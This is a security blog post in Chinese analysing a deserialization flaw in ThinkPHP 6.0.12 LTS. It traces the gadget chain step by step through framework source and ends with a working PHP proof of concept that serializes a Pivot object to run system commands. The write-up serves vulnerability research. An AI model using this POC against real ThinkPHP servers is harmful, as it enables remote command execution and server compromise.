<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="首发于Freebuf安全社区
环境Thinkphp6.0.12LTS(目前最新版本)
PHP7.3.4
安装composer create-project topthink/think tp6
测试代码
漏洞分析漏洞起点不是__desturct就是__wakeup全局搜索下，起点在vendor\to">
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Thinkphp6.0.12LTS反序列化漏洞分析"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>Thinkphp6.0.12LTS反序列化漏洞分析 - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
                Thinkphp6.0.12LTS反序列化漏洞分析
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-02-20</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">首发于Freebuf安全社区</a></p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Thinkphp6.0.12LTS(目前最新版本)</p>
<p>PHP7.3.4</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>composer create-project topthink/think tp6</code></pre>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p><img src="/images/216.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞起点不是<code>__desturct</code>就是<code>__wakeup</code>全局搜索下，起点在<code>vendor\topthink\think-orm\src\Model.php</code></p>
<p>只要把<code>this-&gt;lazySave</code>设为<code>True</code>,就会调用了<code>save</code>方法</p>
<p><img src="/images/217.png"></p>
<p>跟进<code>save</code>方法，漏洞方法是<code>updateData</code>，但需要绕过①且让②为<code>True</code>,①调用<code>isEmpty</code>方法</p>
<p><img src="/images/218.png"></p>
<pre><code>public function save(array $data = [], string $sequence = null): bool
    &#123;
        // 数据对象赋值
        $this-&gt;setAttrs($data);
        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;
            return false;
        &#125;

        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code></pre>
<p>跟进<code>isEmpty</code>方法,只要<code>$this-&gt;data</code>不为空就行。</p>
<p><img src="/images/219.png"></p>
<p><code>$this-&gt;trigger</code>方法默认返回就不是<code>false</code>，跟进<code>updateData</code>方法。漏洞方法是<code>checkAllowFields</code>默认就会触发。</p>
<p><img src="/images/220.png"></p>
<pre><code>protected function updateData(): bool
    &#123;
        // 事件回调
        if (false === $this-&gt;trigger(&#39;BeforeUpdate&#39;)) &#123;
            return false;
        &#125;

        $this-&gt;checkData();

        // 获取有更新的数据
        $data = $this-&gt;getChangedData();

        if (empty($data)) &#123;
            // 关联更新
            if (!empty($this-&gt;relationWrite)) &#123;
                $this-&gt;autoRelationUpdate();
            &#125;

            return true;
        &#125;

        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime) &#123;
            // 自动写入更新时间
            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp();
            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
        &#125;

        // 检查允许字段
        $allowFields = $this-&gt;checkAllowFields();</code></pre>
<p>跟进<code>checkAllowFields</code>方法，漏洞方法是<code>db</code>，默认也是会触发该方法，继续跟进。</p>
<p><img src="/images/221.png"></p>
<pre><code>    protected function checkAllowFields(): array
    &#123;
        // 检测字段
        if (empty($this-&gt;field)) &#123;
            if (!empty($this-&gt;schema)) &#123;
                $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));
            &#125; else &#123;
                $query = $this-&gt;db();</code></pre>
<p>跟进<code>db</code>方法，存在<code>$this-&gt;table . $this-&gt;suffix</code>字符串拼接，可以触发<code>__toString</code>魔术方法，把<code>$this-&gt;table</code>设为触发<code>__toString</code>类即可。</p>
<p><img src="/images/222.png"></p>
<pre><code>public function db($scope = []): Query
    &#123;
        /** @var Query $query */
        $query = self::$db-&gt;connect($this-&gt;connection)
            -&gt;name($this-&gt;name . $this-&gt;suffix)
            -&gt;pk($this-&gt;pk);

        if (!empty($this-&gt;table)) &#123;
            $query-&gt;table($this-&gt;table . $this-&gt;suffix);
        &#125;</code></pre>
<p>全局搜索<code>__toString</code>方法，最后选择<code>vendor\topthink\think-orm\src\model\concern\Conversion.php</code>类中的<code>__toString</code>方法。</p>
<p>跟进<code>__toString</code>方法，调用了<code>toJson</code>方法。</p>
<p><img src="/images/223.png"></p>
<p>跟进<code>toJson</code>方法，调用了<code>toArray</code>方法，然后以JSON格式返回。</p>
<p><img src="/images/224.png"></p>
<p>跟进<code>toArray</code>方法,漏洞方法是<code>getAtrr</code>默认就会触发，只需把<code>$data</code>设为数组就行。</p>
<p><img src="/images/225.png"></p>
<pre><code>public function toArray(): array
    &#123;
        $item       = [];
        $hasVisible = false;

        foreach ($this-&gt;visible as $key =&gt; $val) &#123;
            if (is_string($val)) &#123;
                if (strpos($val, &#39;.&#39;)) &#123;
                    [$relation, $name]          = explode(&#39;.&#39;, $val);
                    $this-&gt;visible[$relation][] = $name;
                &#125; else &#123;
                    $this-&gt;visible[$val] = true;
                    $hasVisible          = true;
                &#125;
                unset($this-&gt;visible[$key]);
            &#125;
        &#125;

        foreach ($this-&gt;hidden as $key =&gt; $val) &#123;
            if (is_string($val)) &#123;
                if (strpos($val, &#39;.&#39;)) &#123;
                    [$relation, $name]         = explode(&#39;.&#39;, $val);
                    $this-&gt;hidden[$relation][] = $name;
                &#125; else &#123;
                    $this-&gt;hidden[$val] = true;
                &#125;
                unset($this-&gt;hidden[$key]);
            &#125;
        &#125;

        // 合并关联数据
        $data = array_merge($this-&gt;data, $this-&gt;relation);

        foreach ($data as $key =&gt; $val) &#123;
            if ($val instanceof Model || $val instanceof ModelCollection) &#123;
                // 关联模型对象
                if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;
                    $val-&gt;visible($this-&gt;visible[$key]);
                &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;
                    $val-&gt;hidden($this-&gt;hidden[$key]);
                &#125;
                // 关联模型对象
                if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;
                    $item[$key] = $val-&gt;toArray();
                &#125;
            &#125; elseif (isset($this-&gt;visible[$key])) &#123;
                $item[$key] = $this-&gt;getAttr($key);
            &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;
                $item[$key] = $this-&gt;getAttr($key);</code></pre>
<p>跟进<code>getAttr</code>方法，漏洞方法是<code>getValue</code>，但传入<code>getValue</code>方法中的<code>$value</code>是由<code>getData</code>方法得到的。</p>
<p><img src="/images/226.png"></p>
<pre><code>    public function getAttr(string $name)
    &#123;
        try &#123;
            $relation = false;
            $value    = $this-&gt;getData($name);
        &#125; catch (InvalidArgumentException $e) &#123;
            $relation = $this-&gt;isRelationAttr($name);
            $value    = null;
        &#125;

        return $this-&gt;getValue($name, $value, $relation);</code></pre>
<p>跟进<code>getData</code>方法，<code>$this-&gt;data</code>可控，<code>$fieldName</code>来自<code>getRealFieldName</code>方法</p>
<p><img src="/images/227.png"></p>
<p>跟进<code>getRealFieldName</code>方法，默认直接返回传入的参数。所以<code>$fieldName</code>也可控，也就是传入<code>getValue</code>的<code>$value</code>参数可控。</p>
<p><img src="/images/228.png"></p>
<p>跟进<code>getValue</code>方法，在Thinkphp6.0.8触发的漏洞点在①处，但在Thinkphp6.0.12时已经对传入的<code>$closure</code>进行判断。此次漏洞方法的<code>getJsonValue</code>方法。但需要经过两个if判断，<code>$this-&gt;withAttr</code>和<code>$this-&gt;json</code>都可控，可顺利进入<code>getJsonValue</code>方法。</p>
<p><img src="/images/229.png"></p>
<pre><code>   protected function getValue(string $name, $value, $relation = false)
    &#123;
        // 检测属性获取器
        $fieldName = $this-&gt;getRealFieldName($name);

        if (array_key_exists($fieldName, $this-&gt;get)) &#123;
            return $this-&gt;get[$fieldName];
        &#125;

        $method = &#39;get&#39; . Str::studly($name) . &#39;Attr&#39;;
        if (isset($this-&gt;withAttr[$fieldName])) &#123;
            if ($relation) &#123;
                $value = $this-&gt;getRelationValue($relation);
            &#125;
            if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) &#123;
                $value = $this-&gt;getJsonValue($fieldName, $value);</code></pre>
<p>跟进<code>getJsonValue</code>方法，触发漏洞的点在<code>$closure($value[$key], $value)</code>只要令<code>$this-&gt;jsonAssoc</code>为<code>True</code>就行。</p>
<p><code>$closure</code>和<code>$value</code>都可控。</p>
<p><img src="/images/230.png"></p>
<pre><code> protected function getJsonValue($name, $value)
    &#123;
        if (is_null($value)) &#123;
            return $value;
        &#125;

        foreach ($this-&gt;withAttr[$name] as $key =&gt; $closure) &#123;
            if ($this-&gt;jsonAssoc) &#123;
                $value[$key] = $closure($value[$key], $value);</code></pre>
<h2 id="完整POP链条"><a href="#完整POP链条" class="headerlink" title="完整POP链条"></a>完整POP链条</h2><p><img src="/images/231.png"></p>
<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><pre><code>&lt;?php

namespace think&#123;

    abstract class Model&#123;
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;

        function __construct($obj = &#39;&#39;)&#123;
            $this-&gt;lazySave = True;
            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;dir&#39;]];
            $this-&gt;exists = True;
            $this-&gt;table = $obj;
            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];
            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];
            $this-&gt;jsonAssoc = True;
        &#125;
    &#125;
&#125;

namespace think\model&#123;
    use think\Model;
    class Pivot extends Model&#123;

    &#125;
&#125;

namespace&#123;
    echo(base64_encode(serialize(new think\model\Pivot(new think\model\Pivot()))));
&#125;</code></pre>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="/images/232.png"></p>
<p><img src="/images/233.png"></p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>